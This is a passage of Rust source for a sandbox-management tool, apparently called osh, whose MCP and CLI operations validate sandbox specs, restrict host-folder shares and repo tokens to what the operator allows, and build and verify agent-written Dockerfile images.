//! Sandbox operations for a headless front end, each answering in JSON. `envelope` is the
//! output contract: the value and exit code 0, or `{"ok":false,"error":...}` and 1.

use crate::sandbox::{self, CreateCtx, SandboxSpec, Share};
use crate::{cli, ghrepo};
use serde_json::{json, Value};
use std::os::unix::process::ExitStatusExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// What every operation runs against.
#[derive(Clone)]
pub struct Ctx {
    /// The data dir (`sandbox-policy.yaml`, `toolchains.toml`, `images/`).
    pub dir: PathBuf,
    /// The gateway to target; `None` = the OpenShell CLI's active one.
    pub gateway: Option<String>,
    /// A spec may mount a host folder only when the caller opted in.
    pub allow_share: bool,
    /// Refuse a share of a risky folder (`sandbox::risky_share`: the disk, the home folder, a
    /// secrets folder, a system folder) instead of only noting it. True for `osh mcp`, whose
    /// specs come from an agent; false for the CLI, whose user names the folder.
    pub refuse_risky_share: bool,
    /// The variables `repo.env_var` may name; `None` = any (the CLI). The MCP server sets the
    /// operator's list, so an agent cannot send an unrelated secret of the server to a forge.
    pub repo_vars: Option<Vec<String>>,
    /// The folders a share must lie in, as canonical paths; `None` = anywhere (the CLI). The
    /// MCP server sets the operator's `OSH_MCP_SHARE_ROOT`, an empty list refusing every share.
    pub share_roots: Option<Vec<PathBuf>>,
    /// The version of the program serving the calls (the MCP `serverInfo`).
    pub version: String,
    /// The longest a background job may run, in seconds (`0` = no limit): the operator's
    /// `mcp.job_max_secs`. Only MCP starts jobs; the CLI leaves it `0`.
    pub job_max_secs: u64,
}

/// Aim every following `openshell` call at the context's gateway. A name starting with `-`
/// would be read by `openshell` as an option after `-g`, so it is refused.
fn target(ctx: &Ctx) -> Result<(), String> {
    let gw = ctx.gateway.as_deref().unwrap_or("");
    if gw.starts_with('-') {
        return Err(format!(
            "invalid gateway name {gw:?}: a gateway name cannot start with `-`"
        ));
    }
    cli::set_thread_gateway(Some(gw));
    Ok(())
}

pub(crate) fn check_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("field `name` is required".into());
    }
    sandbox::validate_name(name)
}

/// A spec that passed every check, with the share path resolved, and what the caller should
/// be told about it.
struct Checked {
    spec: SandboxSpec,
    note: Option<String>,
}

fn home() -> String {
    std::env::var("HOME").unwrap_or_default()
}

/// The spec, checked before anything runs: a valid name, a repo variable the caller allows, and
/// a share only when allowed, only of a folder that is really there, resolved through symlinks
/// (the resolved path is what gets mounted) and, when the context says so, not a risky one.
fn checked_spec(ctx: &Ctx, spec: &Value, home: &str) -> Result<Checked, String> {
    let mut s = SandboxSpec::from_json(spec)?;
    check_name(&s.name)?;
    sandbox::check_limits(&s)?;
    if let Some(g) = &s.repo {
        check_repo_var(ctx, &g.env_var).map_err(|why| match sandbox::grant_repo(&g.url) {
            Ok(r) => token_guidance(&r, &g.env_var, &why, &s.name, false),
            Err(_) => why,
        })?;
    }
    let mut note = None;
    if let Some(share) = &mut s.share {
        if !ctx.allow_share {
            return Err(share_guidance(&share.path, "sharing host folders is off"));
        }
        share.path = resolve_share_path(share)?;
        if let Some(roots) = &ctx.share_roots {
            check_share_root(roots, &share.path)
                .map_err(|why| share_guidance(&share.path, &why))?;
        }
        // The home folder is resolved too, so a symlinked home still matches.
        let home = std::fs::canonicalize(home)
            .ok()
            .and_then(|h| h.to_str().map(String::from))
            .unwrap_or_else(|| home.to_string());
        // The data folder holds the bearer token and the stored secrets: a share of it, or of a
        // folder around it, would hand them to the sandbox.
        let mut risky = sandbox::risky_share(&share.path, &home);
        if let Ok(data) = std::fs::canonicalize(&ctx.dir) {
            let p = Path::new(&share.path);
            if p.starts_with(&data) || data.starts_with(p) {
                risky = Some("it holds osh's own data (tokens)".to_string());
            }
        }
        if let Some(why) = risky {
            if ctx.refuse_risky_share {
                return Err(format!(
                    "sharing {} is refused: {why}; share a project folder instead",
                    share.path
                ));
            }
            note = Some(format!("sharing {} is risky: {why}", share.path));
        }
    }
    Ok(Checked { spec: s, note })
}

/// What to tell the agent when a share is refused for the server's settings: the two commands the
/// user runs (outside this chat), that no restart is needed, and the way out without a share.
fn share_guidance(path: &str, why: &str) -> String {
    format!(
        "Sharing {path} is refused: {why}. Only the user can change that, and never you. Tell the user, in this order:\n\
         A. In a terminal of their own they run: `osh config set mcp.allow_share true` and `osh config set mcp.share_roots {parent}` (several folders are separated by `:`; the share must lie inside one of them; the folder itself works too).\n\
         B. No restart is needed when osh runs as the MCP server service (`osh mcp start`): the settings apply to the next request. An osh started by the agent itself (stdio) reads them when it starts, so the agent client must be restarted.\n\
         C. They tell you it is done and you create the sandbox again.\n\
         Or skip the share: create the sandbox without it and let the code reach the host only through git (the repo grant).",
        parent = path,
    )
}

/// `repo.env_var` must be one the caller allows (`Ctx::repo_vars`). The refusal names the
/// variable only, never a value.
fn check_repo_var(ctx: &Ctx, var: &str) -> Result<(), String> {
    // A token the operator stored (`osh mcp secret set NAME`) is allowed by that very act.
    if crate::secrets::get(&ctx.dir, var).is_some() {
        return Ok(());
    }
    allowed_by_list(ctx, var)
}

/// A token name that says nothing about what it is for (`GITHUB_TOKEN`).
fn is_generic_var(var: &str) -> bool {
    matches!(
        var,
        "GITHUB_TOKEN"
            | "GH_TOKEN"
            | "GITLAB_TOKEN"
            | "BITBUCKET_TOKEN"
            | "FORGEJO_TOKEN"
            | "TOKEN"
            | "GIT_TOKEN"
    )
}

/// What the refusal tells the agent to ask for. The name is the agent's own text, so it only
/// appears in a command line when it is a plain variable name.
fn secret_hint(var: &str) -> String {
    // The names already stored are not listed: a misled agent would learn which ones to target.
    // The user names the one to use in their request.
    if crate::secrets::valid_name(var) && !is_generic_var(var) {
        format!(
            "to allow {var}, the user runs `osh mcp secret set {var}` in a terminal of their own, outside this chat (it asks for the token with a hidden prompt)"
        )
    } else {
        "a token is stored by the user with `osh mcp secret set NAME`, in a terminal of their own"
            .to_string()
    }
}

/// The operator's list of environment variables a spec may name (`mcp.repo_vars`).
fn allowed_by_list(ctx: &Ctx, var: &str) -> Result<(), String> {
    match &ctx.repo_vars {
        None => Ok(()),
        Some(list) if list.is_empty() => Err(format!(
            "repo grants are off: the server operator has not listed any variable in OSH_MCP_REPO_VARS and stored no token; {}",
            secret_hint(var)
        )),
        Some(list) if list.iter().any(|v| v == var) => Ok(()),
        Some(_) => Err(format!(
            "repo.env_var {var:?} is not one of the variables the server operator allows (OSH_MCP_REPO_VARS); {}",
            secret_hint(var)
        )),
    }
}

/// The resolved share path must be one of the roots or inside one. Both sides are canonical,
/// so a symlink or `..` cannot step out, and the comparison is by whole components: `/a/b-x`
/// is not inside `/a/b`. The refusal names the path and the variable, not the roots.
fn check_share_root(roots: &[PathBuf], path: &str) -> Result<(), String> {
    if roots.is_empty() {
        return Err(
            "no share root folder is listed (mcp.share_roots, or OSH_MCP_SHARE_ROOT)".into(),
        );
    }
    if roots.iter().any(|r| Path::new(path).starts_with(r)) {
        return Ok(());
    }
    Err("it is outside the allowed share roots (mcp.share_roots, or OSH_MCP_SHARE_ROOT)".into())
}

/// The share path as an absolute, symlink-free path of an existing directory.
fn resolve_share_path(share: &Share) -> Result<String, String> {
    let p = Path::new(&share.path);
    if !p.is_absolute() {
        return Err(format!(
            "share.path {:?} must be an absolute path",
            share.path
        ));
    }
    let real = std::fs::canonicalize(p)
        .map_err(|e| format!("share.path {:?} cannot be resolved: {e}", share.path))?;
    if !real.is_dir() {
        return Err(format!("share.path {:?} is not a directory", share.path));
    }
    real.into_os_string()
        .into_string()
        .map_err(|_| format!("share.path {:?} is not valid UTF-8", share.path))
}

/// Two notes as one string; either may be absent.
fn join_notes(a: Option<String>, b: Option<String>) -> Option<String> {
    match (a, b) {
        (Some(a), Some(b)) => Some(format!("{a}; {b}")),
        (a, b) => a.or(b),
    }
}

/// The secret named by `repo.env_var`, read from this process's environment, else from the store. Errors name the
/// variable only, never its value.
fn repo_secret(ctx: &Ctx, var: &str) -> Result<String, String> {
    if var.is_empty() || var.contains(['=', '\0']) {
        return Err(format!("repo.env_var {var:?} is not a variable name"));
    }
    // A name the operator stored takes its value from the store, never from the environment:
    // the server's own variables (cloud keys, a broad GITHUB_TOKEN) are not reachable by
    // storing a dummy under their name.
    if let Some(v) = crate::secrets::get(&ctx.dir, var) {
        return Ok(v);
    }
    allowed_by_list(ctx, var)?;
    match std::env::var_os(var) {
        Some(v) if !v.is_empty() => v
            .into_string()
            .map_err(|_| format!("environment variable {var} (repo.env_var) is not valid UTF-8")),
        _ => Err(format!(
            "environment variable {var} (repo.env_var) is unset or empty and no token is stored under that name; {}",
            secret_hint(var)
        )),
    }
}

/// The image a kept sandbox gets when the spec names none: Claude Code's, so the agent has a
/// real working environment. A throwaway one (`command`) keeps OpenShell's own default, and
/// nothing changes when the Dockerfile is not in the data folder.
const DEFAULT_IMAGE: &str = "claude-code:latest";

fn default_image(ctx: &Ctx, s: &mut SandboxSpec) -> Option<String> {
    if !s.image.is_empty()
        || !s.command.is_empty()
        || images_for(&ctx.dir, DEFAULT_IMAGE).is_empty()
    {
        return None;
    }
    s.image = DEFAULT_IMAGE.into();
    Some(format!(
        "no image was given, so a kept sandbox uses {DEFAULT_IMAGE} (built on first use, which can take minutes); name another image to change that"
    ))
}

/// The `description` and `display_name` of a provider profile's text.
fn profile_text(body: &str) -> (String, String) {
    use saphyr::LoadableYamlNode;
    let docs = saphyr::Yaml::load_from_str(body).unwrap_or_default();
    let get = |k: &str| {
        docs.first()
            .and_then(|d| d.as_mapping_get(k))
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string()
    };
    (get("display_name"), get("description"))
}

/// Every name in `spec.providers` must be a provider the gateway has, or a profile osh ships that
/// needs no credential (osh creates that provider now, unless `dry_run` skips the check). A profile that wants a
/// credential is the user's to set up in the dashboard; anything else is refused with the names
/// that would have worked.
fn ensure_providers(ctx: &Ctx, names: &[String], dry_run: bool) -> Result<(), String> {
    // A dry run only shows the plan and asks the gateway nothing.
    if names.is_empty() || dry_run {
        return Ok(());
    }
    let have: Vec<String> = cli::providers()
        .map(|l| l.into_iter().map(|p| p.name).collect())
        .unwrap_or_default();
    let profiles = cli::profile_ids(&ctx.dir);
    for n in names {
        if have.contains(n) {
            continue;
        }
        if profiles.contains(n) {
            if !cli::profile_env_keys(&ctx.dir, n).is_empty() {
                return Err(provider_guidance(ctx, n));
            }
            if !dry_run {
                cli::create_provider(&ctx.dir, n, &[])
                    .map_err(|e| format!("creating provider {n}: {e}"))?;
            }
            continue;
        }
        let free: Vec<&String> = profiles
            .iter()
            .filter(|p| cli::profile_env_keys(&ctx.dir, p).is_empty())
            .collect();
        return Err(format!(
            "no provider or profile named {n:?}; call sandbox_options for the names (profiles that need no credential: {})",
            free.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", ")
        ));
    }
    Ok(())
}

/// `(variable, description)` of each credential a profile asks for.
fn profile_credentials(body: &str) -> Vec<(String, String)> {
    use saphyr::LoadableYamlNode;
    let docs = saphyr::Yaml::load_from_str(body).unwrap_or_default();
    let mut out = Vec::new();
    if let Some(list) = docs
        .first()
        .and_then(|d| d.as_mapping_get("credentials"))
        .and_then(|c| c.as_sequence())
    {
        for c in list {
            let var = match c.as_mapping_get("env_vars") {
                Some(saphyr::Yaml::Sequence(a)) => a.first().and_then(|v| v.as_str()),
                Some(v) => v.as_str(),
                None => None,
            };
            let desc = c
                .as_mapping_get("description")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            if let Some(var) = var {
                out.push((var.to_string(), desc.to_string()));
            }
        }
    }
    out
}

/// Where the user gets the credential of a shipped profile.
fn credential_source(id: &str) -> &'static str {
    match id {
        "claude-code" => "run `claude setup-token` in a terminal of their own (it needs their Claude subscription) and copy the token it prints",
        "github" => "create a fine-grained personal access token at https://github.com/settings/personal-access-tokens/new, limited to the repositories that are needed (for one repo, a repo grant is better: put `repo` in the spec instead)",
        _ => "create it in the service the provider is for (the description below says what it is)",
    }
}

/// What to tell the agent when a spec names a provider that needs a credential: how the user
/// gets it, the one command they run in a terminal of their own, and how to take it away.
fn provider_guidance(ctx: &Ctx, id: &str) -> String {
    let body = std::fs::read_to_string(cli::profile_path(&ctx.dir, id)).unwrap_or_default();
    let creds = profile_credentials(&body);
    let what = creds
        .iter()
        .map(|(v, d)| {
            if d.is_empty() {
                v.clone()
            } else {
                format!("{v}: {d}")
            }
        })
        .collect::<Vec<_>>()
        .join("; ");
    format!(
        "Provider {id} needs a credential that only the user can add ({what}). Tell the user, in this order:\n\
         A. Get the credential: {source}.\n\
         B. In a terminal of their own (outside this chat) they run `osh mcp provider add {id}`; it asks for the credential with a hidden prompt, so it never appears in this session or in their shell history.\n\
         C. They tell you it is done, and you create the sandbox again with providers [\"{id}\"]. For a sandbox that already exists, they attach {id} to it in the osh dashboard (Providers tab), or you create a new sandbox.\n\
         D. To remove it later: in the dashboard's Providers tab (or `openshell provider delete {id}` once no sandbox uses it). That does NOT revoke the credential at the service: they must also revoke it there (for a token, on the page they created it).",
        source = credential_source(id),
    )
}

/// The variables `osh mcp provider add ID` asks for. Only a shipped profile that needs a
/// credential and has no provider yet qualifies.
pub fn provider_keys(ctx: &Ctx, id: &str) -> Result<Vec<String>, String> {
    target(ctx)?;
    if !cli::profile_ids(&ctx.dir).iter().any(|p| p == id) {
        return Err(format!("no provider profile named {id:?}"));
    }
    let keys = cli::profile_env_keys(&ctx.dir, id);
    if keys.is_empty() {
        return Err(format!(
            "{id} needs no credential: osh creates it when a spec names it"
        ));
    }
    if cli::providers()?.iter().any(|p| p.name == id) {
        return Err(format!(
            "provider {id} already exists: change its credential in the osh dashboard (Providers tab)"
        ));
    }
    Ok(keys)
}

/// Create the provider `id` with the credentials the user typed (one value per `provider_keys`
/// name). The values reach `openshell` through its environment, never its arguments.
pub fn provider_add(ctx: &Ctx, id: &str, values: &[(String, String)]) -> Result<String, String> {
    provider_keys(ctx, id)?;
    cli::create_provider(&ctx.dir, id, values)
}

/// A valid image name: lowercase letters, digits and `-`, starting with a letter or digit.
fn valid_image_name(n: &str) -> bool {
    !n.is_empty()
        && n.len() <= 40
        && n.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit())
        && n.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// The images each `FROM` line names (`FROM [--platform=X] IMAGE [AS name]`), skipping a stage
/// that is only an earlier stage of the same file.
fn from_images(text: &str) -> Vec<String> {
    let mut stages: Vec<String> = Vec::new();
    let mut out = Vec::new();
    for line in text.lines() {
        let mut w = line.split_whitespace();
        if !w.next().is_some_and(|k| k.eq_ignore_ascii_case("FROM")) {
            continue;
        }
        let rest: Vec<&str> = w.filter(|t| !t.starts_with("--")).collect();
        let Some(image) = rest.first() else { continue };
        if !stages.iter().any(|s| s == image) {
            out.push((*image).to_string());
        }
        if rest.len() >= 3 && rest[1].eq_ignore_ascii_case("AS") {
            stages.push(rest[2].to_string());
        }
    }
    out
}

/// What a Dockerfile written by an agent may not do before it is built on the user's machine: it
/// needs a `FROM`, must stay a reasonable size, and may not ask Docker for host access
/// (`--network=host`, `--security=insecure`). Build content is the agent's, so these are the
/// fences; the user reading it first (dry_run) is the rest.
fn check_dockerfile(text: &str) -> Result<Option<String>, String> {
    if text.len() > 64 * 1024 {
        return Err("the Dockerfile is over 64 KB".into());
    }
    if text.contains('\0') {
        return Err("the Dockerfile holds a NUL byte".into());
    }
    if from_images(text).is_empty() {
        return Err("the Dockerfile needs a FROM line".into());
    }
    for line in text.lines() {
        let l = line.to_ascii_lowercase();
        if l.contains("--network=host") || l.contains("--security=insecure") {
            return Err(
                "the Dockerfile asks Docker for host access (--network=host or --security=insecure), which osh refuses"
                    .into(),
            );
        }
    }
    let last_user = text
        .lines()
        .filter_map(|l| {
            let mut w = l.split_whitespace();
            w.next()
                .filter(|k| k.eq_ignore_ascii_case("USER"))
                .and_then(|_| w.next())
        })
        .next_back();
    Ok(match last_user {
        None | Some("root") | Some("0") => Some(
            "the image ends as root; sandboxes run as an ordinary user, so end the Dockerfile with `USER node`"
                .to_string(),
        ),
        Some(_) => None,
    })
}

/// Run the container runtime's own Dockerfile parser and lint rules (`build --check`, BuildKit)
/// over `text` in an empty folder; it builds nothing and copies nothing. A syntax error is an
/// `Err` for the agent to fix; lint warnings come back as a note. A runtime without `--check`
/// (Podman, old Docker), no runtime, or a hang past 60 s means no verdict, not a failure.
fn lint_dockerfile(text: &str) -> Result<Option<String>, String> {
    let dir = std::env::temp_dir().join(format!("osh-lint-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let r = run_check(&dir, text);
    let _ = std::fs::remove_dir_all(&dir);
    match r {
        Some((ok, stderr)) => lint_verdict(ok, &stderr),
        None => Ok(None),
    }
}

fn run_check(dir: &Path, text: &str) -> Option<(bool, String)> {
    std::fs::write(dir.join("Dockerfile"), text).ok()?;
    let args = [
        "build".to_string(),
        "--check".into(),
        dir.to_string_lossy().into(),
    ];
    run_deadline(&args, &dir.join("check.log"), 60)
}

/// Run the container runtime with `args`, its stderr and stdout in `log`, killed after `secs`.
/// `None` when it cannot start or overruns; else (success, output).
fn run_deadline(args: &[String], log: &Path, secs: u64) -> Option<(bool, String)> {
    let out = std::fs::File::create(log).ok()?;
    let err = out.try_clone().ok()?;
    let mut child = Command::new(cli::runtime_bin())
        .args(args)
        .stdin(Stdio::null())
        .stdout(out)
        .stderr(err)
        .spawn()
        .ok()?;
    let start = std::time::Instant::now();
    let status = loop {
        if let Some(s) = child.try_wait().ok()? {
            break s;
        }
        if start.elapsed() > std::time::Duration::from_secs(secs) {
            let _ = child.kill();
            let _ = child.wait();
            return None;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    };
    Some((
        status.success(),
        std::fs::read_to_string(log).unwrap_or_default(),
    ))
}

/// Prove the new image does what the work needs: each `verify` command runs in a throwaway
/// container of it with a clean environment (`env -i`, a plain PATH), because a sandbox does not
/// apply the Dockerfile's ENV, so a tool that only works through ENV fails here instead of after
/// the sandbox is made. The container is named and removed.
fn verify_image(tag: &str, verify: &[String]) -> Result<(), String> {
    for (i, cmd) in verify.iter().enumerate() {
        let name = format!("osh-verify-{}-{i}", std::process::id());
        let log = std::env::temp_dir().join(format!("{name}.log"));
        let args: Vec<String> = [
            "run",
            "--rm",
            "--name",
            &name,
            "--entrypoint",
            "env",
            tag,
            "-i",
            "HOME=/home/node",
            "PATH=/usr/local/bin:/usr/bin:/bin",
            "sh",
            "-c",
            cmd,
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let r = run_deadline(&args, &log, 120);
        let _ = cli::run(cli::runtime_bin(), &["rm".into(), "-f".into(), name], &[]);
        let _ = std::fs::remove_file(&log);
        match r {
            Some((true, _)) => {}
            Some((false, out)) => {
                let tail: Vec<&str> = out.lines().rev().take(6).collect();
                return Err(format!(
                    "the image built but `{cmd}` failed in a clean environment ({}); the image was removed. A sandbox does not apply the Dockerfile's ENV (PATH, HOME-like variables), so make the tool work without it: symlink or wrapper in /usr/local/bin, defaults that need no variable. Fix the Dockerfile and call image_build again with the same name",
                    tail.into_iter().rev().collect::<Vec<_>>().join(" | ")
                ));
            }
            None => {
                return Err(format!(
                    "`{cmd}` did not finish in 120 s; the image was removed"
                ))
            }
        }
    }
    Ok(())
}

/// Turn the output of `build --check` into a verdict: a parse error is an error; each
/// `WARNING: Rule - url` plus its message line is a note; anything else (no such flag, daemon
/// down) is no verdict.
fn lint_verdict(ok: bool, stderr: &str) -> Result<Option<String>, String> {
    if !ok {
        if stderr.contains("dockerfile parse error")
            || stderr.contains("failed to solve: dockerfile")
        {
            let msg: Vec<&str> = stderr
                .lines()
                .skip_while(|l| !l.starts_with("ERROR"))
                .map(str::trim_end)
                .filter(|l| !l.is_empty())
                .take(8)
                .collect();
            return Err(format!(
                "the Dockerfile does not parse: {}",
                msg.join(" | ")
            ));
        }
        return Ok(None);
    }
    let mut lines = stderr.lines().map(str::trim).filter(|l| !l.is_empty());
    let mut warnings = Vec::new();
    while let Some(l) = lines.next() {
        if let Some(rule) = l.strip_prefix("WARNING: ") {
            let rule = rule.split(" - ").next().unwrap_or(rule);
            let msg = lines.next().unwrap_or("");
            warnings.push(format!("{rule}: {msg}"));
        }
    }
    warnings.truncate(10);
    Ok((!warnings.is_empty()).then(|| format!("lint: {}", warnings.join("; "))))
}

/// Make a new image `name` from the Dockerfile `dockerfile` (written by the agent, shown to the
/// user first with `dry_run`): write `images/Dockerfile-NAME` in the data folder, so the
/// dashboard's Images tab shows it, and build it. The build context is an empty folder, so
/// nothing of the user's can be copied in; a base that is one of osh's own images is built
/// first when missing. Never overwrites an image or a Dockerfile.
pub fn image_build(
    ctx: &Ctx,
    name: &str,
    dockerfile: &str,
    verify: &[String],
    dry_run: bool,
) -> Result<Value, String> {
    if !valid_image_name(name) {
        return Err(format!(
            "image name {name:?} must be lowercase letters, digits and `-` (at most 40)"
        ));
    }
    let note = check_dockerfile(dockerfile)?;
    if verify.len() > 10
        || verify
            .iter()
            .any(|c| c.trim().is_empty() || c.len() > 500 || c.contains('\0'))
    {
        return Err("`verify` is at most 10 commands of at most 500 characters each".into());
    }
    if !dry_run && verify.is_empty() {
        return Err("`verify` is required for a build: list the commands the work needs this image to run (for example `cargo --version`, `cc --version`); osh runs each in the new image with a clean environment (no Dockerfile ENV, as in the sandbox) and removes the image if one fails".into());
    }
    let file = ctx.dir.join("images").join(format!("Dockerfile-{name}"));
    let tag = cli::dockerfile_tag(&file);
    if file.exists() || cli::image_built(&tag) {
        return Err(format!(
            "an image named {tag} already exists; choose another name (osh never overwrites one)"
        ));
    }
    let text = if dockerfile.ends_with('\n') {
        dockerfile.to_string()
    } else {
        format!("{dockerfile}\n")
    };
    let note = match (note, lint_dockerfile(&text)?) {
        (Some(a), Some(b)) => Some(format!("{a} | {b}")),
        (a, b) => a.or(b),
    };
    if dry_run {
        let mut v = json!({"image": tag, "dockerfile": text, "verify": verify, "built": false,
                           "show_user": "paste this Dockerfile and the verify commands to the user in full, in a code block: a summary is not enough, and the tool output is collapsed in their view"});
        if let Some(n) = note {
            v["note"] = json!(n);
        }
        return Ok(v);
    }
    std::fs::create_dir_all(ctx.dir.join("images")).map_err(|e| e.to_string())?;
    std::fs::write(&file, &text).map_err(|e| format!("writing {}: {e}", file.display()))?;
    let outcome = build_image(ctx, &file, &tag, &text).and_then(|_| verify_image(&tag, verify));
    if let Err(e) = outcome {
        let _ = std::fs::remove_file(&file);
        let _ = cli::run(
            cli::runtime_bin(),
            &["image".into(), "rm".into(), tag.clone()],
            &[],
        );
        return Err(e);
    }
    let mut v = json!({"image": tag, "built": true, "verified": verify,
                       "next": "name it as spec.image when you create the sandbox, then check inside it that it does what was asked"});
    if let Some(n) = note {
        v["note"] = json!(n);
    }
    Ok(v)
}

/// Delete an image osh lists (one with a `Dockerfile-*` in the data folder, as in the Images tab):
/// remove it from the container runtime, and with `remove_dockerfile` the Dockerfile too, unless
/// the Dockerfile ships with osh (it would come back). Any other image of the user's is out of
/// reach by design. The runtime refuses an image a sandbox still runs from; that is not forced.
pub fn image_delete(ctx: &Ctx, name: &str, remove_dockerfile: bool) -> Result<Value, String> {
    let want = name.trim();
    let found = cli::dockerfiles(&ctx.dir)
        .into_iter()
        .find(|f| {
            let t = cli::dockerfile_tag(f);
            t == want || t == format!("{want}:latest")
        })
        .ok_or_else(|| {
            let known: Vec<String> = cli::dockerfiles(&ctx.dir)
                .iter()
                .map(|f| cli::dockerfile_tag(f))
                .collect();
            format!(
                "{want:?} is not an osh image; only these can be deleted: {}",
                known.join(", ")
            )
        })?;
    let tag = cli::dockerfile_tag(&found);
    let file_name = found
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_string();
    if remove_dockerfile && crate::assets::embedded(&format!("images/{file_name}")).is_some() {
        return Err(format!(
            "{tag} ships with osh, so osh would write its Dockerfile back; delete only the image (leave remove_dockerfile off)"
        ));
    }
    let built = cli::image_built(&tag);
    if !built && !remove_dockerfile {
        return Err(format!(
            "{tag} is not built, so there is no image to delete (remove_dockerfile true would drop its Dockerfile)"
        ));
    }
    if built {
        cli::run(
            cli::runtime_bin(),
            &["image".into(), "rm".into(), tag.clone()],
            &[],
        )
        .map_err(|e| {
            format!(
                "could not delete {tag}: {} (a sandbox that runs from it must be deleted first)",
                crate::text::error_summary(&e)
            )
        })?;
    }
    if remove_dockerfile {
        std::fs::remove_file(&found).map_err(|e| format!("removing {}: {e}", found.display()))?;
    }
    let mut v = json!({"image": tag, "deleted": built, "dockerfile_removed": remove_dockerfile});
    if tag == DEFAULT_IMAGE {
        v["note"] = json!("this is the default image of a kept sandbox; the next one rebuilds it, which takes minutes");
    }
    Ok(v)
}

/// Build `file` as `tag` in an empty context, after the osh images it starts from.
fn build_image(ctx: &Ctx, file: &Path, tag: &str, text: &str) -> Result<(), String> {
    for base in from_images(text) {
        if let Some(img) = images_for(&ctx.dir, &base).into_iter().find(|i| !i.built) {
            cli::run(
                cli::runtime_bin(),
                &cli::build_args(&ctx.dir, &img.file, &img.tag),
                &[],
            )
            .map_err(|e| {
                format!(
                    "building the base {}: {}",
                    img.tag,
                    crate::text::error_summary(&e)
                )
            })?;
        }
    }
    let empty = std::env::temp_dir().join(format!("osh-build-ctx-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&empty);
    std::fs::create_dir_all(&empty).map_err(|e| e.to_string())?;
    let mut args = cli::build_args(&ctx.dir, file, tag);
    args.pop();
    args.push(empty.to_string_lossy().into_owned());
    let r = cli::run(cli::runtime_bin(), &args, &[]);
    let _ = std::fs::remove_dir_all(&empty);
    r.map(|_| ())
        .map_err(|e| format!("building {tag}: {}", crate::text::error_summary(&e)))
}

/// The guide for deciding on and writing an image, with the Dockerfiles osh ships as examples.
pub fn image_guide(ctx: &Ctx) -> Result<Value, String> {
    let images: Vec<Value> = cli::dockerfiles(&ctx.dir)
        .into_iter()
        .map(|f| {
            json!({"image": cli::dockerfile_tag(&f),
                   "dockerfile": std::fs::read_to_string(&f).unwrap_or_default()})
        })
        .collect();
    Ok(json!({"guide": crate::imageguide::GUIDE, "dockerfiles": images}))
}

/// What a spec may name, so an agent picks from facts instead of guessing: the images (and which
/// one a kept sandbox gets by default), the providers that exist and the profiles osh can turn
/// into one, and the toolchain host groups.
pub fn sandbox_options(ctx: &Ctx) -> Result<Value, String> {
    target(ctx)?;
    let images: Vec<Value> = cli::dockerfiles(&ctx.dir)
        .into_iter()
        .map(|file| {
            let tag = cli::dockerfile_tag(&file);
            let about = std::fs::read_to_string(&file)
                .unwrap_or_default()
                .lines()
                .find(|l| l.starts_with("# ") && !l.starts_with("# syntax"))
                .map(|l| l.trim_start_matches("# ").to_string())
                .unwrap_or_default();
            json!({"image": tag, "built": cli::image_built(&tag), "about": about,
                   "default_for_kept": tag == DEFAULT_IMAGE})
        })
        .collect();
    let mut profiles = Vec::new();
    for id in cli::profile_ids(&ctx.dir) {
        let body = std::fs::read_to_string(cli::profile_path(&ctx.dir, &id)).unwrap_or_default();
        let (display, about) = profile_text(&body);
        let needs = cli::env_keys_of(&body);
        profiles.push(json!({
            "provider": id, "name": display, "about": about,
            "needs_credential": !needs.is_empty(),
        }));
    }
    let existing: Vec<Value> = cli::providers()
        .unwrap_or_default()
        .into_iter()
        .map(|p| json!({"provider": p.name, "type": p.ty}))
        .collect();
    let groups: Vec<Value> = std::fs::read_to_string(ctx.dir.join("toolchains.toml"))
        .ok()
        .and_then(|t| crate::preload::parse(&t).ok())
        .unwrap_or_default()
        .into_iter()
        .map(|g| {
            json!({"toolchain": g.name, "open_by_default": g.on,
                        "hosts": g.hosts.iter().map(|(h, _)| h.as_str()).collect::<Vec<_>>()})
        })
        .collect();
    Ok(json!({
        "images": images,
        "default_image": {
            "kept": DEFAULT_IMAGE,
            "throwaway": "OpenShell's own default (a spec with `command`)",
        },
        "providers_to_name": profiles,
        "providers_existing": existing,
        "toolchains": groups,
        "how_to_use": "spec.image: a tag from images. spec.providers: names from providers_to_name that need no credential (osh creates them) or from providers_existing. spec.toolchains: the groups to open; leave it out for the ones marked open_by_default, give a list to choose exactly those (name every language the work needs).",
    }))
}

/// The Dockerfile image the spec names, if any, with whether it is built: the only image
/// `plan_create` looks at, so only it is inspected.
fn images_for(dir: &Path, image: &str) -> Vec<cli::Image> {
    if image.is_empty() {
        return Vec::new();
    }
    cli::dockerfiles(dir)
        .into_iter()
        .filter(|f| cli::dockerfile_tag(f) == image)
        .map(|file| {
            let tag = cli::dockerfile_tag(&file);
            cli::Image {
                built: cli::image_built(&tag),
                tag,
                file,
                freshness: Default::default(),
            }
        })
        .collect()
}

/// `[{"name","phase","created"}]` for the sandboxes on the gateway.
pub fn sandbox_list(ctx: &Ctx) -> Result<Value, String> {
    target(ctx)?;
    let list = cli::sandboxes()?;
    Ok(Value::Array(
        list.into_iter()
            .map(|s| json!({"name": s.name, "phase": s.phase, "created": s.created}))
            .collect(),
    ))
}

/// Create a sandbox from a JSON spec. With `dry_run`, only the plan: `{"name","steps"}`
/// (secrets travel through the environment, so the argv shown holds none). Otherwise the repo
/// provider first (when the spec grants a repo), then the plan's steps: `{"name","phase"}`.
pub fn sandbox_create(ctx: &Ctx, spec: &Value, dry_run: bool) -> Result<Value, String> {
    create_in(ctx, spec, dry_run, &home())
}

fn create_in(ctx: &Ctx, spec: &Value, dry_run: bool, home: &str) -> Result<Value, String> {
    let Checked {
        spec: mut s,
        note: share_note,
    } = checked_spec(ctx, spec, home)?;
    let image_note = default_image(ctx, &mut s);
    let grant = match &s.repo {
        Some(g) => Some((sandbox::grant_repo(&g.url)?, repo_secret(ctx, &g.env_var)?)),
        None => None,
    };
    target(ctx)?;
